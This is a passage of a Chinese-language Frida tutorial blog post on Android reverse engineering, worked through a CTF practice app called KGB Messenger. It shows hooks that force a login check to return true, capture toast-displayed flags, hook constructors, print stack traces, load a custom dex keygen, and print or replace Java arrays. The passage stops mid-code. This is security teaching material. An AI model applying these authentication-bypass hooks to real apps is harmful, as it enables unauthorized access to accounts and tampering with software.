class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onLogin</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        EditText editText = (EditText) findViewById(R.id.login_username);</span><br><span class="line">        EditText editText2 = (EditText) findViewById(R.id.login_password);</span><br><span class="line">        <span class="keyword">this</span>.n = editText.getText().toString();</span><br><span class="line">        <span class="keyword">this</span>.o = editText2.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.n != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.o != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.n.isEmpty() &amp;&amp; !<span class="keyword">this</span>.o.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.n.equals(getResources().getString(R.string.username))) &#123;</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">"User not recognized."</span>, <span class="number">0</span>).show();</span><br><span class="line">                editText.setText(<span class="string">""</span>);</span><br><span class="line">                editText2.setText(<span class="string">""</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!j()) &#123;</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">"Incorrect password."</span>, <span class="number">0</span>).show();</span><br><span class="line">                editText.setText(<span class="string">""</span>);</span><br><span class="line">                editText2.setText(<span class="string">""</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i();</span><br><span class="line">                startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, MessengerActivity<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">j</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String str = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">byte</span> b : <span class="keyword">this</span>.m.digest(<span class="keyword">this</span>.o.getBytes())) &#123;</span><br><span class="line">            str = str + String.format(<span class="string">"%x"</span>, <span class="keyword">new</span> Object[]&#123;Byte.valueOf(b)&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.equals(getResources().getString(R.string.password));</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">i</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] cArr = &#123;<span class="string">'('</span>, <span class="string">'W'</span>, <span class="string">'D'</span>, <span class="string">')'</span>, <span class="string">'T'</span>, <span class="string">'P'</span>, <span class="string">':'</span>, <span class="string">'#'</span>, <span class="string">'?'</span>, <span class="string">'T'</span>&#125;;</span><br><span class="line">        cArr[<span class="number">0</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">0</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">1</span>));</span><br><span class="line">        cArr[<span class="number">1</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">1</span>] ^ <span class="keyword">this</span>.o.charAt(<span class="number">0</span>));</span><br><span class="line">        cArr[<span class="number">2</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">2</span>] ^ <span class="keyword">this</span>.o.charAt(<span class="number">4</span>));</span><br><span class="line">        cArr[<span class="number">3</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">3</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">4</span>));</span><br><span class="line">        cArr[<span class="number">4</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">4</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">7</span>));</span><br><span class="line">        cArr[<span class="number">5</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">5</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">0</span>));</span><br><span class="line">        cArr[<span class="number">6</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">6</span>] ^ <span class="keyword">this</span>.o.charAt(<span class="number">2</span>));</span><br><span class="line">        cArr[<span class="number">7</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">7</span>] ^ <span class="keyword">this</span>.o.charAt(<span class="number">3</span>));</span><br><span class="line">        cArr[<span class="number">8</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">8</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">6</span>));</span><br><span class="line">        cArr[<span class="number">9</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">9</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">8</span>));</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"FLAG&#123;"</span> + <span class="keyword">new</span> String(cArr) + <span class="string">"&#125;"</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-29-092522.png" alt=""><br>从资源文件里找到username,密码则是要算一个j()函数，要让它返回true，顺便打印一下i函数toast到界面的flag。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.use(<span class="string">"com.tlamb96.kgbmessenger.LoginActivity"</span>).j.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">Java.use(<span class="string">"android.widget.Toast"</span>).makeText.overload(<span class="string">'android.content.Context'</span>, <span class="string">'java.lang.CharSequence'</span>, <span class="string">'int'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x, y, z</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = Java.use(<span class="string">"java.lang.String"</span>).$<span class="keyword">new</span>(y)</span><br><span class="line">    <span class="built_in">console</span>.log(flag)</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">[Google Pixel::com.tlamb96.spetsnazmessenger]-&gt; FLAG&#123;G&amp;qG13     R0&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-hook构造函数-打印栈回溯"><a href="#Frida-hook-hook构造函数-打印栈回溯" class="headerlink" title="Frida hook :hook构造函数/打印栈回溯"></a>Frida hook :hook构造函数/打印栈回溯</h3><p>总结:<br>hook构造函数实现通过use取得类，然后<code>clazz.$init.implementation = callback</code> hook构造函数。</p><p>我们先学习一下怎么hook构造函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="keyword">new</span> com.tlamb96.kgbmessenger.b.a(R.string.katya, <span class="string">"Archer, you up?"</span>, <span class="string">"2:20 am"</span>, <span class="keyword">true</span>));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">package</span> com.tlamb96.kgbmessenger.b;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">a</span><span class="params">(<span class="keyword">int</span> i, String str, String str2, <span class="keyword">boolean</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.f448a = i;</span><br><span class="line">        <span class="keyword">this</span>.b = str;</span><br><span class="line">        <span class="keyword">this</span>.c = str2;</span><br><span class="line">        <span class="keyword">this</span>.d = z;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>$init</code>来hook构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java.use(<span class="string">"com.tlamb96.kgbmessenger.b.a"</span>).$init.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">i, str1, str2, z</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.$init(i, str1, str2, z)</span><br><span class="line">            <span class="built_in">console</span>.log(i, str1, str2, z)</span><br><span class="line">            printStack(<span class="string">"com.tlamb96.kgbmessenger.b.a"</span>)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-打印栈回溯"><a href="#Frida-hook-打印栈回溯" class="headerlink" title="Frida hook : 打印栈回溯"></a>Frida hook : 打印栈回溯</h3><p>打印栈回溯</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printStack</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Exception = Java.use(<span class="string">"java.lang.Exception"</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = Exception.$<span class="keyword">new</span>(<span class="string">"Exception"</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.toString();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.replace(<span class="regexp">/,/g</span>, <span class="string">"\\n"</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"============================="</span> + name + <span class="string">" Stack strat======================="</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(replaceStr);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"============================="</span> + name + <span class="string">" Stack end=======================\r\n"</span>);</span><br><span class="line">            Exception.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出就是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Google Pixel::com.tlamb96.spetsnazmessenger]-&gt; 2131558449 111 02:27 下午 false</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;com.tlamb96.kgbmessenger.b.a Stack strat&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">com.tlamb96.kgbmessenger.b.a.&lt;init&gt;(Native Method)</span><br><span class="line">com.tlamb96.kgbmessenger.MessengerActivity.onSendMessage(Unknown Source:40)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">android.support.v7.app.m$a.onClick(Unknown Source:25)</span><br><span class="line">android.view.View.performClick(View.java:6294)</span><br><span class="line">android.view.View$PerformClick.run(View.java:24770)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:790)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class="line">android.os.Looper.loop(Looper.java:164)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:6494)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:438)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:807)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;com.tlamb96.kgbmessenger.b.a Stack end&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-手动加载dex并调用"><a href="#Frida-hook-手动加载dex并调用" class="headerlink" title="Frida hook : 手动加载dex并调用"></a>Frida hook : 手动加载dex并调用</h3><p>总结：<br>编译出dex之后，通过<code>Java.openClassFile(&quot;xxx.dex&quot;).load()</code>加载，这样我们就可以正常通过<code>Java.use</code>调用里面的方法了。</p><p>现在我们来继续解决这个问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSendMessage</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">    EditText editText = (EditText) findViewById(R.id.edittext_chatbox);</span><br><span class="line">    String obj = editText.getText().toString();</span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(obj)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.o.add(<span class="keyword">new</span> com.tlamb96.kgbmessenger.b.a(R.string.user, obj, j(), <span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">this</span>.n.c();</span><br><span class="line">        <span class="keyword">if</span> (a(obj.toString()).equals(<span class="keyword">this</span>.p)) &#123;</span><br><span class="line">            Log.d(<span class="string">"MessengerActivity"</span>, <span class="string">"Successfully asked Boris for the password."</span>);</span><br><span class="line">            <span class="keyword">this</span>.q = obj.toString();</span><br><span class="line">            <span class="keyword">this</span>.o.add(<span class="keyword">new</span> com.tlamb96.kgbmessenger.b.a(R.string.boris, <span class="string">"Only if you ask nicely"</span>, j(), <span class="keyword">true</span>));</span><br><span class="line">            <span class="keyword">this</span>.n.c();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b(obj.toString()).equals(<span class="keyword">this</span>.r)) &#123;</span><br><span class="line">            Log.d(<span class="string">"MessengerActivity"</span>, <span class="string">"Successfully asked Boris nicely for the password."</span>);</span><br><span class="line">            <span class="keyword">this</span>.s = obj.toString();</span><br><span class="line">            <span class="keyword">this</span>.o.add(<span class="keyword">new</span> com.tlamb96.kgbmessenger.b.a(R.string.boris, <span class="string">"Wow, no one has ever been so nice to me! Here you go friend: FLAG&#123;"</span> + i() + <span class="string">"&#125;"</span>, j(), <span class="keyword">true</span>));</span><br><span class="line">            <span class="keyword">this</span>.n.c();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.m.b(<span class="keyword">this</span>.m.getAdapter().a() - <span class="number">1</span>);</span><br><span class="line">        editText.setText(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新的一关是一个聊天框，分析一下代码可知，obj是我们输入的内容，输入完了之后，加到一个<code>this.o</code>的ArrayList里。<br>关键的if判断就是<code>if (a(obj.toString()).equals(this.p))</code>和<code>if (b(obj.toString()).equals(this.r))</code>，所有hook a和b函数，让它们的返回值等于下面的字符串即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String p = <span class="string">"V@]EAASB\u0012WZF\u0012e,a$7(&amp;am2(3.\u0003"</span>;</span><br><span class="line"><span class="keyword">private</span> String q;</span><br><span class="line"><span class="keyword">private</span> String r = <span class="string">"\u0000dslp&#125;oQ\u0000 dks$|M\u0000h +AYQg\u0000P*!M$gQ\u0000"</span>;</span><br><span class="line"><span class="keyword">private</span> String s;</span><br></pre></td></tr></table></figure><p>但实际上这题比我想象中的还要麻烦，这题的逻辑上是如果通过了a和b这两个函数的计算，等于对应的值之后，会把用来计算的obj的值赋值给q和s，然后根据这个q和s来计算出最终的flag。<br>所以如果不逆向算法，通过hook的方式通过了a和b的计算，obj的值还是错误的，也计算不出正确的flag。</p><p>这样就逆向一下算法好了，先自己写一个apk，用java去实现注册机。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-004653.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-004915.png" alt=""><br>可以直接把class文件转成dex，不复述，我比较懒，所以我直接解压apk找到<code>classes.dex</code>，并push到手机上。<br>然后用frida加载这个dex，并调用里面的方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dex = Java.openClassFile(<span class="string">"/data/local/tmp/classes.dex"</span>).load();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"decode_P:"</span>+Java.use(<span class="string">"myapplication.example.com.reversea.reverseA"</span>).decode_P());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"r_to_hex:"</span>+Java.use(<span class="string">"myapplication.example.com.reversea.reverseA"</span>).r_to_hex());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">decode_P:Boris, give me the password</span><br><span class="line">r_to_hex:<span class="number">0064736</span>c707d6f510020646b73247c4d0068202b4159516700502a214d24675100</span><br></pre></td></tr></table></figure><h2 id="Frida打印与参数构造"><a href="#Frida打印与参数构造" class="headerlink" title="Frida打印与参数构造"></a>Frida打印与参数构造</h2><ul><li>数组/(字符串)对象数组/gson/Java.array</li><li>对象/多态、强转Java.cast/接口Java.register</li><li>泛型、List、Map、Set、迭代打印</li><li>non-ascii 、 child-gating、rpc 上传到PC上打印<h3 id="char-Object-Object"><a href="#char-Object-Object" class="headerlink" title="char[]/[Object Object]"></a>char[]/[Object Object]</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">"SimpleArray"</span>, <span class="string">"onCreate: SImpleArray"</span>);</span><br><span class="line"><span class="keyword">char</span> arr[][] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>][]; <span class="comment">// 创建一个4行的二维数组</span></span><br><span class="line">arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'春'</span>, <span class="string">'眠'</span>, <span class="string">'不'</span>, <span class="string">'觉'</span>, <span class="string">'晓'</span> &#125;; <span class="comment">// 为每一行赋值</span></span><br><span class="line">arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'处'</span>, <span class="string">'处'</span>, <span class="string">'闻'</span>, <span class="string">'啼'</span>, <span class="string">'鸟'</span> &#125;;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'夜'</span>, <span class="string">'来'</span>, <span class="string">'风'</span>, <span class="string">'雨'</span>, <span class="string">'声'</span> &#125;;</span><br><span class="line">arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'花'</span>, <span class="string">'落'</span>, <span class="string">'知'</span>, <span class="string">'多'</span>, <span class="string">'少'</span> &#125;;</span><br><span class="line">Log.d(<span class="string">"SimpleArray"</span>, <span class="string">"-----横版-----"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123; <span class="comment">// 循环4行</span></span><br><span class="line">    Log.d(<span class="string">"SimpleArraysToString"</span>, Arrays.toString(arr[i]));</span><br><span class="line">    Log.d(<span class="string">"SimpleStringBytes"</span>, Arrays.toString (Arrays.toString (arr[i]).getBytes()));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123; <span class="comment">// 循环5列</span></span><br><span class="line">        Log.d(<span class="string">"SimpleArray"</span>, Character.toString(arr[i][j])); <span class="comment">// 输出数组中的元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        Log.d(<span class="string">"SimpleArray"</span>, <span class="string">","</span>);<span class="comment">// 如果是一、三句，输出逗号</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Log.d(<span class="string">"SimpleArray"</span>, <span class="string">"。"</span>);<span class="comment">// 如果是二、四句，输出句号</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Java.openClassFile(<span class="string">"/data/local/tmp/r0gson.dex"</span>).load();</span><br><span class="line"><span class="keyword">const</span> gson = Java.use(<span class="string">'com.r0ysue.gson.Gson'</span>);</span><br><span class="line"></span><br><span class="line">Java.use(<span class="string">"java.lang.Character"</span>).toString.overload(<span class="string">'char'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">char</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.toString(char);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"char,result"</span>,char,result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Java.use(<span class="string">"java.util.Arrays"</span>).toString.overload(<span class="string">'[C'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">charArray</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.toString(charArray);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"charArray,result:"</span>,charArray,result)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"charArray Object Object:"</span>,gson.$<span class="keyword">new</span>().toJson(charArray));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这里的<code>[C</code>是JNI函数签名<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-033242.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-033633.png" alt=""></li></ul><h3 id="byte"><a href="#byte" class="headerlink" title="byte[]"></a>byte[]</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.openClassFile(<span class="string">"/data/local/tmp/r0gson.dex"</span>).load();</span><br><span class="line"><span class="keyword">const</span> gson = Java.use(<span class="string">'com.r0ysue.gson.Gson'</span>);</span><br><span class="line"></span><br><span class="line">Java.use(<span class="string">"java.util.Arrays"</span>).toString.overload(<span class="string">'[B'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">byteArray</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.toString(byteArray);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"byteArray,result):"</span>,byteArray,result)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"byteArray Object Object:"</span>,gson.$<span class="keyword">new</span>().toJson(byteArray));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-034053.png" alt=""></p><h3 id="java-array构造"><a href="#java-array构造" class="headerlink" title="java array构造"></a>java array构造</h3><p>如果不只是想打印出结果，而是要替换原本的参数，就要先自己构造出一个charArray,使用<code>Java.array</code>API</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates a Java array with elements of the specified `type`, from a</span></span><br><span class="line"><span class="comment"> * JavaScript array `elements`. The resulting Java array behaves like</span></span><br><span class="line"><span class="comment"> * a JS array, but can be passed by reference to Java APIs in order to</span></span><br><span class="line"><span class="comment"> * allow them to modify its contents.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>type Type name of elements.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>elements Array of JavaScript values to use for constructing the</span></span><br><span class="line"><span class="comment"> *                 Java array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">function array(type: string, elements: any[]): any[];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.use(<span class="string">"java.util.Arrays"</span>).toString.overload(<span class="string">'[C'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">charArray</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newCharArray = Java.array(<span class="string">'char'</span>, [ <span class="string">'一'</span>,<span class="string">'去'</span>,<span class="string">'二'</span>,<span class="string">'三'</span>,<span class="string">'里'</span> ]);</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.toString(newCharArray);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"newCharArray,result:"</span>,newCharArray,result)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"newCharArray Object Object:"</span>,gson.$<span class="keyword">new</span>().toJson(newCharArray));</span><br><span class="line">    <span class="keyword">var</span> newResult = Java.use(<span class="string">'java.lang.String'</span>).$<span class="keyword">new</span>(Java.array(<span class="string">'char'</span>, [ <span class="string">'烟'</span>,<span class="string">'村'</span>,<span class="string">'四'</span>,<span class="string">'五'</span>,<span class="string">'家'</span>]))</span><br><span class="line">    <span class="keyword">return</span> 